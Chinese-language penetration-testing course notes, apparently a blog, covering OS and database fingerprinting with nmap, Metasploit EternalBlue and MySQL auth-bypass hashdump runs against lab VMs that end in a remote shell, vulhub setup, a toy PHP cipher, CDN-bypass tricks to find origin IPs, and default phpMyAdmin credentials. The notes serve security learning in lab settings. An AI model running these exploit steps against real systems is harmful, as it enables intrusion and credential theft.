<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">5.1 操作系统层面</span><br><span class="line">    识别操作系统常见方法</span><br><span class="line">        1.字母大小写 windows不敏感 linux敏感</span><br><span class="line">            windows:http://localhost/LEarninGPHP/index.PHP</span><br><span class="line">        2.ping值 </span><br><span class="line">        	ttl=128-》linux </span><br><span class="line">        	ttl=64或255-》windows</span><br><span class="line">        	ttl 32-&gt;windows98</span><br><span class="line">        	ttl 255-&gt;unix</span><br><span class="line">        3.nmap -O ip</span><br><span class="line">            linux yum安装</span><br><span class="line">            windows 官网exe安装 文件夹里面有一个nmap.exe</span><br><span class="line">            	nmap.exe -O 1.117.139.173</span><br><span class="line">            namp -O ip#-O是操作系统</span><br><span class="line">    简要两者区别及识别意义情况</span><br><span class="line">        可以帮助我们明确思路</span><br><span class="line">        可以筛选掉不符合系统的情况</span><br><span class="line">    操作系统层面漏洞类型对应意义</span><br><span class="line">        覆盖面广</span><br><span class="line">        获取的权限高</span><br><span class="line">        危害性大</span><br><span class="line">5.2 数据库层面</span><br><span class="line">	识别数据库类型常见方法</span><br><span class="line">        nmap -O ip</span><br><span class="line">        nmap ip -p 端口，通过端口开放反推数据库</span><br><span class="line">    数据库类型区别及识别意义</span><br><span class="line">        数据库的漏洞和类型相性很强</span><br><span class="line">        不同数据库漏洞爆发点不太一样</span><br><span class="line">        能确定数据库类型、版本，会对渗透有很大帮助</span><br><span class="line">	数据库常见漏洞类型及攻击</span><br><span class="line">        弱口令</span><br><span class="line">        sql注入</span><br><span class="line">	简要数据库层面漏洞影响范围 </span><br><span class="line">        要参考数据库的重要程来判定影响范围</span><br><span class="line">    常见的数据库结构</span><br><span class="line">        ASP+Access或者sqlserver(1433)</span><br><span class="line">        php+mysql 		3306</span><br><span class="line">        axpx+mssql</span><br><span class="line">        jsp+mssql，oracle(1521) </span><br><span class="line">        python+mongodb(27017)</span><br><span class="line">    服务器端口</span><br><span class="line">        关系型数据库 --MySQL:3306 --SqlServer:1433 --Oracle:1521</span><br><span class="line">        NOSQL数据库 --MongoDB:27017 --Redis:6379 --memcached:11211</span><br><span class="line">	第三方</span><br><span class="line">        如何判断那些有第三方平台或软件 -- 端口扫描 -- 特征匹配</span><br><span class="line">        简要为什么要识别第三方平台或软件 -- 可以提供额外的攻击面</span><br><span class="line">        常见第三方平台或软件漏洞类型及攻击 -- 弱口令</span><br><span class="line">        简要第三方平台或软件安全测试的范围</span><br><span class="line">    除去常规WEB安全及APP安全测试外，类似服务器单一或复杂的其他服务( 邮件，游戏，负载均衡等)，也可以作为安全测试目标，此类目标测试原则只是少了WEB应用或其他安全问题。所以明确安全测试思路是很重要的!</span><br><span class="line">    资源</span><br><span class="line">        https://nmap.org/</span><br><span class="line">        https://www.kali.org/downloads/ </span><br><span class="line">        https://github.com/hellogoldsnakeman/masnmapscan-V1.0端口扫描工具，速度快但是功能没有nmap好</span><br><span class="line">        https://pypi.tuna.tsinghua.edu.cn/simple-------清华大学python镜像 </span><br><span class="line">        https://pypi.tuna.tsinghua.edu.cn-------清华大学python镜像</span><br><span class="line">        https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010</span><br></pre></td></tr></table></figure>

<h4 id="Windows-Server-2008-R2-x64操作系统层面"><a href="#Windows-Server-2008-R2-x64操作系统层面" class="headerlink" title="Windows Server 2008 R2 x64	操作系统层面"></a>Windows Server 2008 R2 x64	操作系统层面</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2008 R2 x64</span><br><span class="line"></span><br><span class="line">cmd-&gt;msfconsole</span><br><span class="line">search ms17_010</span><br><span class="line">use windows/smb/ms17_010_eternablue</span><br><span class="line">show options</span><br><span class="line">set rhost 192.168.213.129			#win server</span><br><span class="line">set lhost 192.168.213.130			#kali</span><br><span class="line">run</span><br><span class="line">shell</span><br><span class="line">ipconfig</span><br></pre></td></tr></table></figure>

<h4 id="mysql身份认证绕过漏洞-数据库弱口令"><a href="#mysql身份认证绕过漏洞-数据库弱口令" class="headerlink" title="mysql身份认证绕过漏洞  数据库弱口令"></a>mysql身份认证绕过漏洞  数据库弱口令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">这个任务复现失败了。。连不上192.168.213.135:3306,phpMyAdmin也不上</span><br><span class="line">	https://vulhub.org/#/environments/mysql/CVE-2012-2122/</span><br><span class="line">然后重装了centos_vulhub，攻击了但是没攻击成功</span><br><span class="line"></span><br><span class="line">https://vulhub.org/#/environments/mysql/CVE-2012-2122/</span><br><span class="line">开启靶场</span><br><span class="line">systemctl docker start#先打开dokcer</span><br><span class="line">cd /root/vulhub/mysql/CVE-2012-2122</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">本地装过musql5.7.27-log 80端口重复打不开</span><br><span class="line">开始攻击</span><br><span class="line">nmap -sV -O 192.168.213.135得知mysql版本5.5.23对照受影响版本</span><br><span class="line">cmd-》msfconsole</span><br><span class="line">search mysql</span><br><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line">show options</span><br><span class="line">set RHOSTS 192.168.213.135</span><br><span class="line">set threads 10</span><br><span class="line">run或者exploit   #攻击</span><br><span class="line"></span><br><span class="line">关闭环境</span><br><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>

<h4 id="第三方phpmyadmin反序列化-第三方应用安全漏洞"><a href="#第三方phpmyadmin反序列化-第三方应用安全漏洞" class="headerlink" title="第三方phpmyadmin反序列化 第三方应用安全漏洞"></a>第三方phpmyadmin反序列化 第三方应用安全漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">参考https://vulhub.org/#/environments/phpmyadmin/WooYun-2016-199433/</span><br><span class="line">打开环境</span><br><span class="line">cd /root/vulhub/phpmyadmin/WooYun-2016-199433</span><br><span class="line">docker-compose build		#编译</span><br><span class="line">docker-compose up -d		#启动</span><br><span class="line"></span><br><span class="line">利用是抓包更具exploit改,涉及反序列化</span><br></pre></td></tr></table></figure>

<h3 id="day06-加密算法"><a href="#day06-加密算法" class="headerlink" title="day06 加密算法"></a>day06 加密算法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">6.1 常见加密编码等算法解析</span><br><span class="line">	MD5，SHA，ASCII，进制，时间戳，URL，BASE64，Unescape，AES，DES 等</span><br><span class="line">		hash(不可逆，解密时枚举，彩虹表) md5分为md5(32位)和16位MD5</span><br><span class="line">		ascii 8位</span><br><span class="line">		16进制文本</span><br><span class="line">		时间戳e.g. 20220709 1657296000</span><br><span class="line">		url</span><br><span class="line">		base64			一个等号</span><br><span class="line">6.2 常见加密形式算法解析</span><br><span class="line">	直接加密，带 salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</span><br><span class="line">6.3 常见解密方式</span><br><span class="line">	枚举，自定义逆向算法，可逆向</span><br><span class="line">6.4 了解常规加密算法的特性</span><br><span class="line">	长度位数，字符规律，代码分析，搜索获取等</span><br><span class="line">6.5 工具</span><br><span class="line">	链接：https://pan.baidu.com/s/1A5Jjc-spYBKlKiPNbaetbQ 提取码：8eh7 </span><br><span class="line">	http://tool.chacuo.net/cryptaes</span><br><span class="line">资源</span><br><span class="line">    https://www.mozhe.cn</span><br><span class="line">    https://www.cmd5.com</span><br><span class="line">    http://tool.chacuo.net/cryptaes	</span><br><span class="line">    https://ctf.bugku.com/challenges</span><br></pre></td></tr></table></figure>

<h4 id="自定义加密算法及解密"><a href="#自定义加密算法及解密" class="headerlink" title="自定义加密算法及解密"></a>自定义加密算法及解密</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line">    <span class="comment">#print $key;</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span> (<span class="variable">$key</span>);</span><br><span class="line">    <span class="comment">#print $len;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$x</span> == <span class="variable">$klen</span>)</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span> ;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span> += <span class="number">1</span>;</span><br><span class="line">        <span class="comment">#print $key[$X];</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#print $char[0].$char[1].$char[2];</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span> ((<span class="title function_ invoke__">ord</span> (<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="title function_ invoke__">ord</span> (<span class="variable">$char</span>[<span class="variable">$i</span>]))%<span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span> (<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="string">&#x27;helloword&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$mkey</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line">    <span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$mkey</span>);</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$str</span>;</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$tmp</span>);         <span class="comment">//解密base64</span></span><br><span class="line">    <span class="variable">$md_len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$tmp</span>);            <span class="comment">//获取输入加密字符长度</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$char</span> = <span class="string">&quot;&quot;</span>;                         <span class="comment">//临时数组</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$md_len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>)&#123;               <span class="comment">//当加密字符串长度超出key</span></span><br><span class="line">             <span class="variable">$x</span> = <span class="number">0</span>;                    <span class="comment">//的长度时查重头开始和获取    </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$mkey</span>[<span class="variable">$x</span>];             <span class="comment">//.= 累积函数</span></span><br><span class="line">        <span class="variable">$x</span> += <span class="number">1</span>;</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    <span class="variable">$md_data</span> = <span class="keyword">array</span>();                 <span class="comment">//获取加密字符中的ASCII数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$md_len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$md_data</span>,<span class="title function_ invoke__">ord</span>(<span class="variable">$tmp</span>[<span class="variable">$i</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$md_data_source</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$data1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$data2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$md_data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;<span class="comment">//最终还原</span></span><br><span class="line">        <span class="variable">$i</span> = <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span> &gt;= <span class="title function_ invoke__">strlen</span>(<span class="variable">$mkey</span>))&#123;</span><br><span class="line">            <span class="variable">$i</span> = <span class="variable">$i</span> - <span class="title function_ invoke__">strlen</span>(<span class="variable">$mkey</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$dd</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$od</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$mkey</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$md_data_source</span>,<span class="variable">$dd</span>);</span><br><span class="line">        <span class="variable">$data1</span> .=<span class="title function_ invoke__">chr</span>((<span class="variable">$dd</span>+<span class="number">128</span>)-<span class="variable">$od</span>);        <span class="comment">//原数据加key的Ascii大于128</span></span><br><span class="line">        <span class="variable">$data2</span> .=<span class="title function_ invoke__">chr</span>(<span class="variable">$dd</span>-<span class="variable">$od</span>);              <span class="comment">//原数据加key的Ascii小于128</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;data1 =&gt;&quot;</span>.<span class="variable">$data1</span>.<span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;data2 =&gt;&quot;</span>.<span class="variable">$data2</span>.<span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;HxclIiEqIiUY&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">decrypt</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="带盐加密"><a href="#带盐加密" class="headerlink" title="带盐加密"></a>带盐加密</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(md5($pass).$salt)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">google</span><br><span class="line">	inurl:id=MQ==</span><br><span class="line">		MQ==解密是1</span><br></pre></td></tr></table></figure>

<h3 id="day07-CDN相关技术"><a href="#day07-CDN相关技术" class="headerlink" title="day07-CDN相关技术"></a>day07-CDN相关技术</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">	CDN的全称是Content Delivery Network,即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后</span><br><span class="line">	超级ping(ping.chinaz.com)	ping ip或域名，看是否会出现变化无</span><br><span class="line">	nslookup 域名，看是否会有很多节点</span><br><span class="line">7.2 CDN对测试有何影响&amp;如何绕过</span><br><span class="line">    子域名查询：有的网站主域名会做CDN，但是子域名可能不会做，可以通过子域名推算主域名ip</span><br><span class="line">    	子域名和主站的关系	同ip 同网段 或不在一个网段</span><br><span class="line">    邮件服务查询：我们访问别人，可能通过CND，但别人访问我们通常不会走CDN</span><br><span class="line">    国外地址请求：国外访问国内网站，大概率没有cdn节点的话，可能直接走原ip</span><br><span class="line">    遗留文件，扫描全网</span><br><span class="line">    	谷歌inurl:phpinfo.php</span><br><span class="line">    		这个文件可能会保存真实ip</span><br><span class="line">    黑暗引擎搜索特定文件</span><br><span class="line">    	shodan</span><br><span class="line">    	zoomeye</span><br><span class="line">    	钟馗之眼</span><br><span class="line">    	fofa</span><br><span class="line">    dns历史记录，以量打量：CDN节点是有流量上限的，用光之后就会直通原机，这也是一种流量攻击</span><br><span class="line">7.3 测试</span><br><span class="line">    子域名上面的小技巧</span><br><span class="line">        二级域名和三级域名查到的结果可能不一样</span><br><span class="line">        主域名和子域名查询到的可能不一样</span><br><span class="line">        	sp910.com,(xueersi.com改了)</span><br><span class="line">        	sp910.com和m.sp910.com（mobile）内容一样，子域名可能没做cdn</span><br><span class="line">        DNS历史记录=第三方接口(接口查询)		#微步社区</span><br><span class="line">        	sp910</span><br><span class="line">        采集/国外请求(同类型访问)</span><br><span class="line">        邮件源码测试对比第三方查询(地区分析)</span><br><span class="line">        	用foxmail查看mozhe登录验证的邮件，邮件邮件源代码</span><br><span class="line">        get-site-ip.com</span><br><span class="line">        黑暗引擎(shodan搜指定hash文件)</span><br><span class="line">		扫全网 fuckcdn，w8fuckcdn，zmap等</span><br><span class="line">		工具扫描</span><br><span class="line">		认为判定，根据网站的域名备案推测</span><br><span class="line">        本地清下dns，然后hosts里写上得到的ip和域名，如果是cdn可能会出现刷新异常，如果打开很快大概率是原机</span><br><span class="line">资料</span><br><span class="line">	https://www.shodan.io</span><br><span class="line">	https://x.threatbook.cn					#微步社区</span><br><span class="line">	http://ping.chinaz.com</span><br><span class="line">	https://www.get-site-ip.com/			#国外查询网站</span><br><span class="line">	https://asm.ca.com/en/ping.php			#好像免费</span><br><span class="line">	</span><br><span class="line">	#fuckcdn w8fuckcdn zmap</span><br><span class="line">	https://github.com/boy-hack/w8fuckcdn	#w8Fuckcdn通过扫描全网绕过CDN获取网站IP地址</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如下图找出网站的ico然后运行计算hash值然后使用shodan搜索得出ip</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1665891407844.png" alt="1665891407844"></p>
<h3 id="day08-信息收集-架构-搭建-WAF"><a href="#day08-信息收集-架构-搭建-WAF" class="headerlink" title="day08-信息收集-架构 搭建 WAF"></a>day08-信息收集-架构 搭建 WAF</h3><p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/640-1688030934153.png" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">CMS识别技术</span><br><span class="line">	帮助识别平台</span><br><span class="line">	开源工具</span><br><span class="line">源码获取技术</span><br><span class="line">	前面	淘宝什么的</span><br><span class="line">架构信息获取</span><br><span class="line">    前面 	操作系统信息之类</span><br><span class="line"></span><br><span class="line">8.1 站点搭建分析</span><br><span class="line">    搭建习惯-目录型站点，两个目录不同的程序</span><br><span class="line">    	sti.blcu.edu.cn		sti.blcu.edu.cn/bbs/(打不开了)</span><br><span class="line">    搭建习惯-端口类站点</span><br><span class="line">    	web.0516jz.com	80 8080端口</span><br><span class="line">    搭建习惯-子域名站点</span><br><span class="line">    	goodlift---www.bbs	子域名2套系统</span><br><span class="line">    搭建习惯-类似域名站点</span><br><span class="line">    	jmlsd---cn.com.net等各种域名后缀</span><br><span class="line">    搭建习惯-旁注, c段站点</span><br><span class="line">    	旁注：同一服务器不同站点		百度搜索旁注查询	</span><br><span class="line">    		192.168.1.100</span><br><span class="line">    			www.a.com</span><br><span class="line">    			www.b.com</span><br><span class="line">    			...</span><br><span class="line">    	C段：同网段不同服务器不同站点</span><br><span class="line">    		192.168.1.100</span><br><span class="line">    			www.a.com</span><br><span class="line">    			www.b.com</span><br><span class="line">    			...</span><br><span class="line">            192.168.1.101</span><br><span class="line">    			www.c.com</span><br><span class="line">    			www.d.com</span><br><span class="line">    			...</span><br><span class="line">    搭建习惯-搭建软件特征站点		shadan搜索useragent</span><br><span class="line">    	useragent很全的一般是搭建软件，比如宝塔 phpstudy</span><br><span class="line">    		宝塔面板8888端口，用http访问不用https</span><br><span class="line">    		phpMyAdmin弱口令密码root root</span><br><span class="line">    		ip/phpmyadmin这个是window的不区分大小写phpMyAdmin</span><br><span class="line">8.2 WAF防护分析</span><br><span class="line">	什么是WAF应用? --  Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。</span><br><span class="line">		安全狗、宝塔、云盾、安骑士</span><br><span class="line">	一般公司的都是带硬件的，自己玩的一般是软件</span><br><span class="line">    如何快速识别WAF?</span><br><span class="line">    	wafwoof</span><br><span class="line">    		https://github.com/EnableSecurity/wafw00f</span><br><span class="line">    识别WAF对于安全测试的意义?</span><br><span class="line">	资源</span><br><span class="line">        https://www.shodan.io/</span><br><span class="line">        https://www.webscan.cc/ </span><br><span class="line">        https://github.com/EnableSecurity/wafw00f</span><br></pre></td></tr></table></figure>

<h3 id="day09-信息收集-APP及其他资产"><a href="#day09-信息收集-APP及其他资产" class="headerlink" title="day09-信息收集 APP及其他资产"></a>day09-信息收集 APP及其他资产</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">APP及其他资产</span><br><span class="line">在安全测试中，若WEB无法取得进展或无WEB的情况下，我们需要借助APP或其他资产在进行信息收集,从而开展后续渗透</span><br><span class="line">9.1 APE提取一键反编译提取</span><br><span class="line">使用反编译工具，尝试获取包了里的源码</span><br><span class="line">9.2 APP抓数据包进行工具配合</span><br><span class="line">使用burp suite设置代理，或者wireshark抓数据包，进行分析</span><br><span class="line">9.3 各种第三方应用相关探针技术</span><br><span class="line">https://www.shodan.io/</span><br><span class="line">https://fofa.so/</span><br><span class="line">9.4 各种服务接口信息相关探针技术</span><br><span class="line">记录</span><br><span class="line">使用burp代理模拟器时，提示证书错误，后将burp生成的证书导入后正常，导入时需要将.cer改成.der。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">黑暗引擎的端口扫描会有遗漏自己用zenmap扫</span><br><span class="line">备案查询</span><br></pre></td></tr></table></figure>

